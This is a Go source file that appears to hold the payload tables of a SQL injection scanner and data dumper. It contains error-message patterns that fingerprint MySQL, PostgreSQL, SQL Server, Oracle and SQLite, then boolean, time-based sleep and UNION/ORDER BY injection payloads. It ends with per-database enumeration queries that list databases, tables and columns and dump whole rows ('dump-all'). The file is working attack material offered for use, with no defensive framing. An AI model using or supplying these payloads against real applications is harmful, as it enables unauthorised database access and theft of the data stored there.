package main

// DBMS Identification Patterns
var DBMSPatterns = map[string][]string{
	"MySQL": {
		"SQL syntax.*MySQL",
		"Warning.*mysql_.*",
		"valid MySQL result",
		"MySqlClient.",
	},
	"PostgreSQL": {
		"PostgreSQL.*ERROR",
		"Warning.*pg_.*",
		"valid PostgreSQL result",
		"Npgsql.",
	},
	"Microsoft SQL Server": {
		"Driver.* SQL Server",
		"OLE DB.* SQL Server",
		"\bSQL Server\b.*Driver",
		"Warning.*mssql_.*",
		"Microsoft SQL Native Client error '[0-9a-fA-F]{8}'",
	},
	"Oracle": {
		"\bORA-[0-9][0-9][0-9][0-9][0-9]",
		"Oracle error",
		"Oracle.*Driver",
		"Warning.*oci_.*",
	},
	"SQLite": {
		"SQLite/JDBCDriver",
		"SQLite.Exception",
		"System.Data.SQLite.SQLiteException",
		"Warning.*sqlite_.*",
	},
}

// Error-based patterns
var ErrorPatterns = []string{
	"SQL syntax",
	"mysql_fetch",
	"ORA-",
	"PostgreSQL",
	"SQLite/JDBCDriver",
	"System.Data.SqlClient",
	"Microsoft OLE DB Provider for SQL Server",
	"Unclosed quotation mark after the character string",
	"You have an error in your SQL syntax",
	"Warning: mysql_",
	"function.mysql",
	"syntax error at or near",
}

// Boolean-based payloads (True and False pairs)
type BooleanPayload struct {
	True  string
	False string
}

var BooleanPayloads = []BooleanPayload{
	{"' AND 1=1 --", "' AND 1=2 --"},
	{"\" AND 1=1 --", "\" AND 1=2 --"},
	{"' AND '1'='1", "' AND '1'='2"},
	{"\" AND \"1\"=\"1", "\" AND \"1\"=\"2"},
	{" AND 1=1", " AND 1=2"},
	{") AND 1=1 --", ") AND 1=2 --"},
	{"') AND 1=1 --", "') AND 1=2 --"},
}

// Time-based payloads with dynamic sleep values
var TimePayloads = []string{
	"SLEEP(5)",
	"pg_sleep(5)",
	"WAITFOR DELAY '0:0:5'",
	"(SELECT 1 FROM (SELECT(SLEEP(5)))a)",
	"DBMS_LOCK.SLEEP(5)",
	"XOR(if(now()=sysdate(),sleep(5),0))OR",
}

// Union-based detection payload
var UnionPayloads = []string{
	"' ORDER BY 1--",
	"' ORDER BY 2--",
	"' ORDER BY 3--",
	"' ORDER BY 4--",
	"' ORDER BY 5--",
	"' UNION SELECT NULL--",
	"' UNION SELECT NULL,NULL--",
	"' UNION SELECT NULL,NULL,NULL--",
}

// EnumPayloads maps DBMS to their enumeration queries
var EnumPayloads = map[string]map[string]string{
	"MySQL": {
		"list-dbs":     "UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
		"list-tables":  "UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()--",
		"list-columns": "UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='%s'--",
		"banner":       "UNION SELECT @@version--",
		"user":         "UNION SELECT user()--",
		"dump-all":     "UNION SELECT GROUP_CONCAT(CONCAT_WS(':', %s)) FROM %s.%s--",
	},
	"PostgreSQL": {
		"list-dbs":     "UNION SELECT string_agg(datname, ',') FROM pg_database--",
		"list-tables":  "UNION SELECT string_agg(tablename, ',') FROM pg_catalog.pg_tables WHERE schemaname='public'--",
		"list-columns": "UNION SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='%s'--",
		"banner":       "UNION SELECT version()--",
		"dump-all":     "UNION SELECT string_agg(CONCAT_WS(':', %s), ',') FROM %s--",
	},
	"Microsoft SQL Server": {
		"list-dbs":     "UNION SELECT name FROM master..sysdatabases--",
		"list-tables":  "UNION SELECT name FROM sysobjects WHERE xtype='U'--",
		"banner":       "UNION SELECT @@version--",
		"dump-all":     "UNION SELECT (SELECT %s + ':' FOR XML PATH('')) FROM %s--",
	},
	"Oracle": {
		"list-dbs":    "UNION SELECT owner FROM all_tables GROUP BY owner--",
		"list-tables": "UNION SELECT table_name FROM all_tables WHERE owner='%s'--",
		"banner":      "UNION SELECT banner FROM v$version--",
	},
	"SQLite": {
		"list-tables": "UNION SELECT name FROM sqlite_master WHERE type='table'--",
		"list-columns": "PRAGMA table_info('%s')--",
	},
}
